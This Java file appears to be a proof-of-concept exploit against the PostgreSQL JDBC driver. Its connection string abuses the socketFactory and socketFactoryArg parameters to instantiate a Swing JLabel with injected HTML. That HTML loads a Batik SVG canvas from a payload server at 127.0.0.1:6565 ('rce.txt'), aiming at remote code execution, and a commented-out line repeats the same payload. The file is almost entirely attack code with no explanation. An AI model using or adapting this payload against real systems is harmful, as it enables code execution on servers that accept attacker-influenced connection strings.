package org.example;

import javax.swing.*;
import java.sql.DriverManager;

public class Main {
    public static void main(String[] args) throws Exception{
        Class.forName("org.postgresql.Driver");
//        new JLabel("<html>" +
//                "<object classid=\"org.apache.batik.swing.JSVGCanvas\"><param name=\"URI\" value=\"http://127.0.0.1:6565/rce.txt\"></object>");

        DriverManager.getConnection("jdbc:postgresql://127.0.0.1:5432/test/?" +
                "socketFactory=javax.swing.JLabel&" +
                "socketFactoryArg=<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='http://127.0.0.1:6565/rce.txt'></object>");
    }
}